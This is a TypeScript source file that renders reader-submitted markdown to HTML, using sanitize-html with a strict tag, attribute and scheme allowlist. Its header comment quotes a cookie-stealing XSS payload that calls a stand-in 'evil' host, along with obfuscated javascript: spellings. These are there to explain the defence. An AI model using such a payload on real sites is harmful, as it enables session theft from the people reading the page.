/**
 * Markdown a *reader* wrote, rendered so that it cannot execute.
 *
 * # Why this file exists at all
 *
 * `LessonBody` renders markdown too, and it is deliberately not reused. The
 * difference is trust, not formatting. A lesson comes from the private content
 * repo, written by whoever has push access to it, so `marked` passing its raw
 * html through is a feature there. An article arrives from a signed-in
 * stranger through `POST /api/articles`, and that same behaviour is stored
 * cross-site scripting: `<img src=x onerror=fetch('//evil/'+document.cookie)>`
 * in a body, rendered into `v-html`, runs as whoever is *reading* the page.
 *
 * Rust stores the body as typed and renders nothing — deliberately — which
 * means **this file is the only place an article's markdown becomes html.**
 *
 * # How it is sanitised
 *
 * By `sanitize-html`, and by nothing written here. There is no hand-rolled
 * escaping, no url regex and no custom `marked` renderer in this file, because
 * each of those is a guess about what an attack looks like and the attacks
 * that matter are the ones nobody guessed. Two steps, in order:
 *
 *   1. `marked` turns markdown into html. It is not a security boundary and is
 *      not treated as one — assume its output contains whatever the author put
 *      in, raw html included.
 *   2. `sanitize-html` parses that html and keeps only an allowlist of tags
 *      and attributes. This is the boundary, and it is the whole boundary.
 *
 * `sanitize-html` is the standard server-side choice for this: it parses with
 * `htmlparser2`, so it sees the same tree a browser would rather than
 * pattern-matching a string, and it needs no DOM. DOMPurify is the equivalent
 * name on the client, and using it here would mean shipping `jsdom` into the
 * runtime image to give it a DOM to work against — a far larger dependency for
 * the same answer. Both are real sanitisers; this is the one that fits a Nitro
 * server.
 *
 * Scheme filtering is the library's `allowedSchemes` and
 * `allowProtocolRelative`, not ours. That is what handles `javascript:` and
 * its spellings — `JaVaScRiPt:`, `java&Tab;script:`, the entity forms,
 * embedded control characters — because the parser decodes and normalises the
 * attribute value before the scheme is checked. A regex over the raw string
 * does not, which is exactly why there is not one here.
 *
 * # What is deliberately not allowed
 *
 *   - Any raw html from the author. Not a reduced subset, none.
 *   - `style` and `class`: css can load urls and position an element over the
 *     page's own chrome. The one exception is `class` on `<code>`, bounded by
 *     a pattern, so syntax highlighting still has a hook.
 *   - `id`: a body that mints ids can collide with the page's own anchors.
 *   - Every url scheme but http, https and mailto, and protocol-relative urls.
 *   - `<iframe>`, `<form>`, `<input>`, `<style>`, `<script>` and every event
 *     handler attribute — by not being on the allowlist, rather than by being
 *     named on a blocklist.
 *
 * # Testing it
 *
 * `SafeMarkdown.test.ts` holds the payloads this has to survive. Add to it
 * before changing anything here.
 */

import { marked } from 'marked'
import sanitizeHtml from 'sanitize-html'

/** Roughly a reading pace, and the same 220 `LessonBody` uses. */
const WORDS_A_MINUTE = 220

/**
 * The allowlist the rendered html has to survive.
 *
 * Tags are what markdown can legitimately produce, and nothing else. A tag not
 * named here has its markup dropped and its text kept — except for the handful
 * in the library's `nonTextTags` default (`script`, `style`, `textarea`,
 * `option`, `noscript`), whose *contents* go too. That is the right way round:
 * the text of a dropped `<em>` is prose worth keeping, and the text of a
 * dropped `<script>` is a payload.
 */
const ALLOWED: sanitizeHtml.IOptions = {
  allowedTags: [
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'br', 'hr',
    'strong', 'em', 'del', 's', 'sup', 'sub',
    'blockquote',
    'ul', 'ol', 'li',
    'pre', 'code',
    'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
  ],

  allowedAttributes: {
    a: ['href', 'title', 'rel', 'target'],
    img: ['src', 'alt', 'title', 'loading'],
    // Markdown's table alignment. An attribute, not an inline style.
    th: ['align'],
    td: ['align'],
    // `language-rust` and friends, bounded by `allowedClasses` below.
    code: ['class'],
  },

  // The library's own scheme filtering, applied after it has parsed and
  // normalised the attribute — which is what makes it hold against the
  // obfuscated spellings a string comparison misses.
  allowedSchemes: ['http', 'https', 'mailto'],
  allowedSchemesAppliedToAttributes: ['href', 'src'],
  // `//evil.test/x` inherits the page's scheme: an off-site url in an on-site
  // coat.
  allowProtocolRelative: false,

  // Only the highlight hook, and only the shape a language name can take — so
  // a class carrying anything else is not one this keeps.
  allowedClasses: {
    code: [/^language-[a-zA-Z0-9#+._-]+$/],
  },

  // No inline css at all.
  allowedStyles: {},

  // Every link an author writes is untrusted and leaves the site. `ugc` is
  // what the attribute is for; `noopener`/`noreferrer` stop the opened page
  // getting a handle back on this one. `simpleTransform` is the library's own,
  // so these land on every `<a>` whatever the markdown said.
  transformTags: {
    a: sanitizeHtml.simpleTransform('a', {
      rel: 'nofollow ugc noopener noreferrer',
      target: '_blank',
    }),
    img: sanitizeHtml.simpleTransform('img', { loading: 'lazy' }),
  },

  disallowedTagsMode: 'discard',
}

/** The author's markdown as html, with nothing in it that can run. */
export function renderArticle(markdown: string): string {
  // marked is a formatter here, not a filter. Everything that makes the output
  // safe happens on the next line.
  const rendered = marked.parse(markdown, { async: false }) as string

  return sanitizeHtml(rendered, ALLOWED)
}

/** Minutes, never zero — a one-line article still takes a moment. */
export function readMinutesOf(markdown: string): number {
  return Math.max(1, Math.round(markdown.split(/\s+/).length / WORDS_A_MINUTE))
}
